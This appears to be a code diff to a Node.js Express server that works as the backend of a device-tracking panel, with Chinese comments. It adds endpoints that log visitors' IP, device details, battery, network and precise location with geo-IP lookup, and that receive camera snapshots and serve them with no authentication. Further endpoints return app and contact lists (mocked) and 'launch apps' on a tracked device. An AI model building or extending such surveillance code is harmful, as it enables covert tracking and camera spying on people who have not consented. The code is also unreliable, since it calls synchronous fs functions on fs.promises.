@@ -5,7 +5,27 @@ const rateLimit = require('express-rate-limit');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs').promises;
+const multer = require('multer');
+const geoip = require('geoip-lite');
+const UAParser = require('ua-parser-js');
+
 require('dotenv').config();
+
+// 配置图片存储
+const storage = multer.diskStorage({
+    destination: function (req, file, cb) {
+        const dir = path.join(__dirname, '../uploads');
+        if (!fs.existsSync(dir)) {
+            fs.mkdirSync(dir, { recursive: true });
+        }
+        cb(null, dir);
+    },
+    filename: function (req, file, cb) {
+        cb(null, 'latest-camera.jpg');
+    }
+});
+
+const upload = multer({ storage: storage });
 
 class Server {
     constructor() {
@@ -14,7 +34,6 @@ class Server {
         this.setupMiddleware();
         this.setupRoutes();
         this.setupErrorHandling();
-        this.visitors = new Map();
         this.deviceData = new Map();
     }
 
@@ -65,32 +84,71 @@ class Server {
 
         // 追踪API
         this.app.post('/api/track', async (req, res) => {
-            const clientIP = req.ip || req.connection.remoteAddress;
-            const data = {
-                ...req.body,
-                ip: clientIP,
-                timestamp: new Date().toISOString()
-            };
-            
-            // 保存设备数据
-            this.deviceData.set(clientIP, data);
-            await this.saveDeviceData(data);
-            
-            res.status(200).send({ status: 'ok' });
+            try {
+                const clientIP = req.ip || req.connection.remoteAddress;
+                const userAgent = req.headers['user-agent'];
+                const parser = new UAParser(userAgent);
+                const parsedUA = parser.getResult();
+                const geoData = geoip.lookup(clientIP) || {};
+                
+                const data = {
+                    device: {
+                        model: parsedUA.device.model || 'Unknown',
+                        os: `${parsedUA.os.name} ${parsedUA.os.version}`,
+                        browser: `${parsedUA.browser.name} ${parsedUA.browser.version}`,
+                        battery: req.body.battery || { level: 0 },
+                        network: req.body.network || { type: 'Unknown' },
+                        memory: req.body.memory || 0
+                    },
+                    location: {
+                        lat: req.body.data?.lat || geoData.ll?.[0] || 0,
+                        lon: req.body.data?.lon || geoData.ll?.[1] || 0,
+                        city: geoData.city || 'Unknown',
+                        country: geoData.country || 'Unknown',
+                        isp: geoData.org || 'Unknown',
+                        ip: clientIP
+                    },
+                    timestamp: new Date().toISOString()
+                };
+                
+                this.deviceData.set(clientIP, data);
+                await this.saveDeviceData(data);
+                
+                res.status(200).send({ status: 'ok' });
+            } catch (error) {
+                console.error('Error processing track request:', error);
+                res.status(500).send({ status: 'error', message: error.message });
+            }
         });
 
         // 监控API
         this.app.get('/api/monitor', this.authenticate.bind(this), async (req, res) => {
-            const devices = Array.from(this.deviceData.values());
-            res.json({
-                devices,
-                system: {
-                    platform: process.platform,
-                    nodeVersion: process.version,
-                    memory: process.memoryUsage(),
-                    cpu: process.cpuUsage()
-                }
-            });
+            try {
+                const clientIP = req.query.ip || req.ip;
+                const deviceInfo = this.deviceData.get(clientIP) || {
+                    device: {
+                        model: 'Unknown',
+                        os: 'Unknown',
+                        browser: 'Unknown',
+                        battery: { level: 0 },
+                        network: { type: 'Unknown' },
+                        memory: 0
+                    },
+                    location: {
+                        lat: 0,
+                        lon: 0,
+                        city: 'Unknown',
+                        country: 'Unknown',
+                        isp: 'Unknown',
+                        ip: clientIP
+                    }
+                };
+                
+                res.json(deviceInfo);
+            } catch (error) {
+                console.error('Error in monitor API:', error);
+                res.status(500).json({ error: 'Internal server error' });
+            }
         });
 
         // 获取应用列表
@@ -101,13 +159,12 @@ class Server {
                 return res.status(404).json({ error: 'Device not found' });
             }
             
-            // 这里应该是从设备获取的实际应用列表
             const mockApps = [
-                { id: 'com.whatsapp', name: 'WhatsApp' },
-                { id: 'com.facebook', name: 'Facebook' },
-                { id: 'com.instagram', name: 'Instagram' },
-                { id: 'com.twitter', name: 'Twitter' },
-                { id: 'com.snapchat', name: 'Snapchat' }
+                { id: 'com.whatsapp', name: 'WhatsApp', icon: '📱' },
+                { id: 'com.facebook', name: 'Facebook', icon: '👥' },
+                { id: 'com.instagram', name: 'Instagram', icon: '📷' },
+                { id: 'com.twitter', name: 'Twitter', icon: '🐦' },
+                { id: 'com.snapchat', name: 'Snapchat', icon: '👻' }
             ];
             
             res.json(mockApps);
@@ -121,11 +178,10 @@ class Server {
                 return res.status(404).json({ error: 'Device not found' });
             }
             
-            // 这里应该是从设备获取的实际通讯录
             const mockContacts = [
-                { name: '张三', phone: '13800138000' },
-                { name: '李四', phone: '13900139000' },
-                { name: '王五', phone: '13700137000' }
+                { name: '张三', phone: '138****8000', avatar: '👨' },
+                { name: '李四', phone: '139****9000', avatar: '👩' },
+                { name: '王五', phone: '137****7000', avatar: '🧑' }
             ];
             
             res.json(mockContacts);
@@ -136,10 +192,24 @@ class Server {
             const { appId } = req.body;
             const clientIP = req.query.ip;
             
-            // 这里应该是实际启动应用的逻辑
             this.log(`尝试启动应用: ${appId} on device: ${clientIP}`);
             
             res.json({ status: 'success', message: `已尝试启动应用: ${appId}` });
+        });
+
+        // 处理摄像头图片上传
+        this.app.post('/api/camera-update', upload.single('image'), (req, res) => {
+            res.json({ success: true });
+        });
+
+        // 获取最新的摄像头图片
+        this.app.get('/api/camera-image', (req, res) => {
+            const imagePath = path.join(__dirname, '../uploads/latest-camera.jpg');
+            if (fs.existsSync(imagePath)) {
+                res.sendFile(imagePath);
+            } else {
+                res.status(404).send('No image available');
+            }
         });
     }
 
